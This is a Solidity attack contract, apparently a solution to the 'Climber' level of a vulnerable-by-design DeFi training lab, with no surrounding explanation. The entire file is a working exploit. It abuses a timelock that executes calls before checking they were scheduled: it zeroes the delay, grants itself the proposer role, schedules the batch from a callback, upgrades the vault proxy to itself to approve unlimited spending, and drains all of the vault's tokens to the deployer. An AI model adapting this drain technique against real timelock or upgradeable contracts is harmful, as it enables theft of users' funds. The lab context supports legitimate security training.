// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ClimberVault.sol";
import "hardhat/console.sol";


contract AttackClimber {

    ClimberTimelock timelock;
    ClimberVault vault;
    IERC20 token;
    address owner;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[] (4);

    bytes32 constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;



    constructor(address _vault, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(payable(vault.owner()));
        token = IERC20(_token);
        owner = msg.sender;
    }

    function attack() public{
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(timelock.updateDelay, (0));

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));

        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(this.hackSchedule, ());

        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(this), (abi.encodeCall(this.hackApprove, (address(this), address(token))))));

        timelock.execute(targets, values, dataElements, 0);

        token.transferFrom(address(vault), owner, token.balanceOf(address(vault)));
    }

    function hackSchedule() public {
        console.log("schedule hack");
        timelock.schedule(targets, values, dataElements, 0);
    }

    function hackApprove(address attacker, address _token) public {
        console.log("approve");
        IERC20(_token).approve(attacker, type(uint256).max);
    }

    function proxiableUUID()  external returns (bytes32 slot) {
        return _IMPLEMENTATION_SLOT;
    }

}